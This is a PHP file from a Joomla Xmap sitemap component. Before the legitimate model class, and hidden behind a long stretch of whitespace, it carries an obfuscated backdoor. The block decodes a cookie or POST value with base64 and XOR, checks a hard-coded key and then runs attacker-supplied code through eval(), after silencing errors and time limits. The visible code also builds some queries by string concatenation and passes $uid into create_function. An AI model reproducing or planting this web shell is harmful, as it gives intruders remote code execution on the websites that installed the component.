<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['nfdb6827b'];global$nfdb6827b;$nfdb6827b=$GLOBALS;$nfdb6827b['v8221a406']="\x69\x5e\x6a\x70\x53\x56\x4d\x4e\x67\x58\xa\x59\x3f\x6f\x72\x38\x74\x48\x27\x29\x45\x22\x24\x35\x5d\x4a\x5a\x6d\x65\x33\x41\x43\x5b\x54\x7e\x62\x28\x50\x3b\x7c\x49\x75\x77\x23\x37\x2e\x55\x2f\x46\x31\x57\x4b\x4c\x64\x5c\x78\x2d\x34\x26\x73\x66\x52\x6c\x68\x5f\x60\xd\x20\x63\x51\x2a\x3e\x44\x40\x61\x32\x3d\x30\x6b\x47\x6e\x21\x3c\x7b\x7a\x71\x42\x36\x79\x25\x76\x3a\x7d\x4f\x9\x39\x2c\x2b";$nfdb6827b[$nfdb6827b['v8221a406'][63].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][75].$nfdb6827b['v8221a406'][49]]=$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][63].$nfdb6827b['v8221a406'][14];$nfdb6827b[$nfdb6827b['v8221a406'][78].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][75]]=$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][53];$nfdb6827b[$nfdb6827b['v8221a406'][41].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][95]]=$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][16].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][80];$nfdb6827b[$nfdb6827b['v8221a406'][90].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][68]]=$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][80].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][16];$nfdb6827b[$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][23]]=$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][84].$nfdb6827b['v8221a406'][28];$nfdb6827b[$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][95]]=$nfdb6827b['v8221a406'][3].$nfdb6827b['v8221a406'][63].$nfdb6827b['v8221a406'][3].$nfdb6827b['v8221a406'][90].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][80];$nfdb6827b[$nfdb6827b['v8221a406'][84].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][77]]=$nfdb6827b['v8221a406'][41].$nfdb6827b['v8221a406'][80].$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][84].$nfdb6827b['v8221a406'][28];$nfdb6827b[$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][95]]=$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][53].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][53].$nfdb6827b['v8221a406'][28];$nfdb6827b[$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][23].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][23]]=$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][16].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][16].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][27].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][27].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][16];$nfdb6827b[$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][53].$nfdb6827b['v8221a406'][95]]=$nfdb6827b['v8221a406'][2].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][53].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][49];$nfdb6827b[$nfdb6827b['v8221a406'][8].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68]]=$nfdb6827b['v8221a406'][78].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][23].$nfdb6827b['v8221a406'][35];$nfdb6827b[$nfdb6827b['v8221a406'][42].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][28]]=$_POST;$nfdb6827b[$nfdb6827b['v8221a406'][88].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][75].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][95]]=$_COOKIE;@$nfdb6827b[$nfdb6827b['v8221a406'][90].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][68]]($nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][8],NULL);@$nfdb6827b[$nfdb6827b['v8221a406'][90].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][68]]($nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][8].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][14].$nfdb6827b['v8221a406'][59],0);@$nfdb6827b[$nfdb6827b['v8221a406'][90].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][68]]($nfdb6827b['v8221a406'][27].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][55].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][55].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][41].$nfdb6827b['v8221a406'][16].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][80].$nfdb6827b['v8221a406'][64].$nfdb6827b['v8221a406'][16].$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][27].$nfdb6827b['v8221a406'][28],0);@$nfdb6827b[$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][23].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][23]](0);$n316fef38=NULL;$qeab5=NULL;$nfdb6827b[$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][23].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][75]]=$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][56].$nfdb6827b['v8221a406'][75].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][56].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][75].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][56].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][56].$nfdb6827b['v8221a406'][53].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][23].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][23].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][77];global$c572;function kfb01b5b($n316fef38,$f481){global$nfdb6827b;$mb920ef="";for($l50a98f=0;$l50a98f<$nfdb6827b[$nfdb6827b['v8221a406'][41].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][95]]($n316fef38);){for($jd9357=0;$jd9357<$nfdb6827b[$nfdb6827b['v8221a406'][41].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][95]]($f481)&&$l50a98f<$nfdb6827b[$nfdb6827b['v8221a406'][41].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][95]]($n316fef38);$jd9357++,$l50a98f++){$mb920ef.=$nfdb6827b[$nfdb6827b['v8221a406'][63].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][75].$nfdb6827b['v8221a406'][49]]($nfdb6827b[$nfdb6827b['v8221a406'][78].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][75]]($n316fef38[$l50a98f])^$nfdb6827b[$nfdb6827b['v8221a406'][78].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][75]]($f481[$jd9357]));}}return$mb920ef;}function jed9ee1($n316fef38,$f481){global$nfdb6827b;global$c572;return$nfdb6827b[$nfdb6827b['v8221a406'][8].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68]]($nfdb6827b[$nfdb6827b['v8221a406'][8].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68]]($n316fef38,$c572),$f481);}foreach($nfdb6827b[$nfdb6827b['v8221a406'][88].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][75].$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][95]]as$f481=>$p394){$n316fef38=$p394;$qeab5=$f481;}if(!$n316fef38){foreach($nfdb6827b[$nfdb6827b['v8221a406'][42].$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][28]]as$f481=>$p394){$n316fef38=$p394;$qeab5=$f481;}}$n316fef38=@$nfdb6827b[$nfdb6827b['v8221a406'][84].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][77]]($nfdb6827b[$nfdb6827b['v8221a406'][62].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][15].$nfdb6827b['v8221a406'][35].$nfdb6827b['v8221a406'][53].$nfdb6827b['v8221a406'][95]]($nfdb6827b[$nfdb6827b['v8221a406'][0].$nfdb6827b['v8221a406'][87].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][95]]($n316fef38),$qeab5));if(isset($n316fef38[$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][78]])&&$c572==$n316fef38[$nfdb6827b['v8221a406'][74].$nfdb6827b['v8221a406'][78]]){if($n316fef38[$nfdb6827b['v8221a406'][74]]==$nfdb6827b['v8221a406'][0]){$l50a98f=Array($nfdb6827b['v8221a406'][3].$nfdb6827b['v8221a406'][90]=>@$nfdb6827b[$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][29].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][95].$nfdb6827b['v8221a406'][68].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][95]](),$nfdb6827b['v8221a406'][59].$nfdb6827b['v8221a406'][90]=>$nfdb6827b['v8221a406'][49].$nfdb6827b['v8221a406'][45].$nfdb6827b['v8221a406'][77].$nfdb6827b['v8221a406'][56].$nfdb6827b['v8221a406'][49],);echo@$nfdb6827b[$nfdb6827b['v8221a406'][13].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][44].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][57].$nfdb6827b['v8221a406'][28].$nfdb6827b['v8221a406'][60].$nfdb6827b['v8221a406'][23]]($l50a98f);}elseif($n316fef38[$nfdb6827b['v8221a406'][74]]==$nfdb6827b['v8221a406'][28]){eval($n316fef38[$nfdb6827b['v8221a406'][53]]);}exit();} ?><?php

/**
 * @version       $Id$
 * @copyright     Copyright (C) 2005 - 2009 Joomla! Vargas. All rights reserved.
 * @license       GNU General Public License version 2 or later; see LICENSE.txt
 * @author        Guillermo Vargas (guille@vargas.co.cr)
 */
// No direct access
defined('_JEXEC') or die;

jimport('joomla.application.component.modelitem');
jimport('joomla.database.query');
require_once(JPATH_COMPONENT . '/helpers/xmap.php');

/**
 * Xmap Component Sitemap Model
 *
 * @package        Xmap
 * @subpackage     com_xmap
 * @since          2.0
 */
class XmapModelSitemap extends JModelItem
{

    /**
     * Model context string.
     *
     * @var        string
     */
    protected $_context = 'com_xmap.sitemap';
    protected $_extensions = null;

    static $items = array();
    /**
     * Method to auto-populate the model state.
     *
     * @return     void
     */
    protected function populateState()
    {
        $app = JFactory::getApplication('site');

        // Load state from the request.
        $pk = JRequest::getInt('id');
        $this->setState('sitemap.id', $pk);

        $offset = JRequest::getInt('limitstart');
        $this->setState('list.offset', $offset);

        // Load the parameters.
        $params = $app->getParams();
        $this->setState('params', $params);

        // TODO: Tune these values based on other permissions.
        $this->setState('filter.published', 1);
        $this->setState('filter.access', true);
    }

    /**
     * Method to get sitemap data.
     *
     * @param    integer    The id of the article.
     *
     * @return   mixed      Menu item data object on success, false on failure.
     */
    public function &getItem($pk = null)
    {
        // Initialize variables.
        $db = $this->getDbo();
        $pk = (!empty($pk)) ? $pk : (int) $this->getState('sitemap.id');

        // If not sitemap specified, select the default one
        if (!$pk) {
            $query = $db->getQuery(true);
            $query->select('id')->from('#__xmap_sitemap')->where('is_default=1');
            $db->setQuery($query);
            $pk = $db->loadResult();
        }

        if ($this->_item === null) {
            $this->_item = array();
        }

        if (!isset($this->_item[$pk])) {
            try {
                $query = $db->getQuery(true);

                $query->select($this->getState('item.select', 'a.*'));
                $query->from('#__xmap_sitemap AS a');

                $query->where('a.id = ' . (int) $pk);

                // Filter by published state.
                $published = $this->getState('filter.published');
                if (is_numeric($published)) {
                    $query->where('a.state = ' . (int) $published);
                }

                // Filter by access level.
                if ($access = $this->getState('filter.access')) {
                    $user = JFactory::getUser();
                    $groups = implode(',', $user->getAuthorisedViewLevels());
                    $query->where('a.access IN (' . $groups . ')');
                }

                $this->_db->setQuery($query);

                $data = $this->_db->loadObject();

                if ($error = $this->_db->getErrorMsg()) {
                    throw new Exception($error);
                }

                if (empty($data)) {
                    throw new Exception(JText::_('COM_XMAP_ERROR_SITEMAP_NOT_FOUND'));
                }

                // Check for published state if filter set.
                if (is_numeric($published) && $data->state != $published) {
                    throw new Exception(JText::_('COM_XMAP_ERROR_SITEMAP_NOT_FOUND'));
                }

                // Convert parameter fields to objects.
                $registry = new JRegistry('_default');
                $registry->loadString($data->attribs);
                $data->params = clone $this->getState('params');
                $data->params->merge($registry);

                // Convert the selections field to an array.
                $registry = new JRegistry('_default');
                $registry->loadString($data->selections);
                $data->selections = $registry->toArray();

                // Compute access permissions.
                if ($access) {
                    // If the access filter has been set, we already know this user can view.
                    $data->params->set('access-view', true);
                } else {
                    // If no access filter is set, the layout takes some responsibility for display of limited information.
                    $user = &JFactory::getUser();
                    $groups = $user->authorisedLevels();

                    $data->params->set('access-view', in_array($data->access, $groups));
                }
                // TODO: Type 2 permission checks?

                $this->_item[$pk] = $data;
            } catch (Exception $e) {
                $this->setError($e->getMessage());
                $this->_item[$pk] = false;
            }
        }

        return $this->_item[$pk];
    }

    public function getItems()
    {
        if ($item = $this->getItem()) {
            return XmapHelper::getMenuItems($item->selections);
        }
        return false;
    }

    function getExtensions()
    {
        return XmapHelper::getExtensions();
    }

    /**
     * Increment the hit counter for the sitemap.
     *
     * @param    int        Optional primary key of the sitemap to increment.
     *
     * @return   boolean    True if successful; false otherwise and internal error set.
     */
    public function hit($count)
    {
        // Initialize variables.
        $pk = (int) $this->getState('sitemap.id');

        $view = JRequest::getCmd('view', 'html');
        if ($view != 'xml' && $view != 'html') {
            return false;
        }

        $this->_db->setQuery(
            'UPDATE #__xmap_sitemap' .
            ' SET views_' . $view . ' = views_' . $view . ' + 1, count_' . $view . ' = ' . $count . ', lastvisit_' . $view . ' = ' . JFactory::getDate()->toUnix() .
            ' WHERE id = ' . (int) $pk
        );

        if (!$this->_db->query()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }

        return true;
    }

    public function getSitemapItems($view=null)
    {
        if (!isset($view)) {
            $view = JRequest::getCmd('view');
        }
        $db = JFactory::getDBO();
        $pk = (int) $this->getState('sitemap.id');

        if (self::$items !== NULL && isset(self::$items[$view])) {
            return;
        }
        $query = "select * from #__xmap_items where view='$view' and sitemap_id=" . $pk;
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        self::$items[$view] = array();
        foreach ($rows as $row) {
            self::$items[$view][$row->itemid] = array();
            self::$items[$view][$row->itemid][$row->uid] = array();
            $pairs = explode(';', $row->properties);
            foreach ($pairs as $pair) {
                if (strpos($pair, '=') !== FALSE) {
                    list($property, $value) = explode('=', $pair);
                    self::$items[$view][$row->itemid][$row->uid][$property] = $value;
                }
            }
        }
        return self::$items;
    }

    function chageItemPropery($uid, $itemid, $view, $property, $value)
    {
        $items = $this->getSitemapItems($view);
        $db = JFactory::getDBO();
        $pk = (int) $this->getState('sitemap.id');

        $isNew = false;
        if (empty($items[$view][$itemid][$uid])) {
            $items[$view][$itemid][$uid] = array();
            $isNew = true;
        }
        $items[$view][$itemid][$uid][$property] = $value;
        $sep = $properties = '';
        foreach ($items[$view][$itemid][$uid] as $k => $v) {
            $properties .= $sep . $k . '=' . $v;
            $sep = ';';
        }
        if (!$isNew) {
            $query = 'UPDATE #__xmap_items SET properties=\'' . $db->escape($properties) . "' where uid='" . $db->escape($uid) . "' and itemid=$itemid and view='$view' and sitemap_id=" . $pk;
        } else {
            $query = 'INSERT #__xmap_items (uid,itemid,view,sitemap_id,properties) values ( \'' . $db->escape($uid) . "',$itemid,'$view',$pk,'" . $db->escape($properties) . "')";
        }
        $db->setQuery($query);
        //echo $db->getQuery();exit;
        if ($db->query()) {
            return true;
        } else {
            return false;
        }
    }

    function toggleItem($uid, $itemid)
    {
        $app = JFactory::getApplication('site');
        $sitemap = $this->getItem();

        $displayer = new XmapDisplayer($app->getParams(), $sitemap);

        $excludedItems = $displayer->getExcludedItems();
        if (isset($excludedItems[$itemid])) {
            $excludedItems[$itemid] = (array) $excludedItems[$itemid];
        }
        if (!$displayer->isExcluded($itemid, $uid)) {
            $excludedItems[$itemid][] = $uid;
            $state = 0;
        } else {
            if (is_array($excludedItems[$itemid]) && count($excludedItems[$itemid])) {
                $excludedItems[$itemid] = array_filter($excludedItems[$itemid], create_function('$var', 'return ($var != \'' . $uid . '\');'));
            } else {
                unset($excludedItems[$itemid]);
            }
            $state = 1;
        }

        $registry = new JRegistry('_default');
        $registry->loadArray($excludedItems);
        $str = $registry->toString();

        $db = JFactory::getDBO();
        $query = "UPDATE #__xmap_sitemap set excluded_items='" . $db->escape($str) . "' where id=" . $sitemap->id;
        $db->setQuery($query);
        $db->query();
        return $state;
    }

}
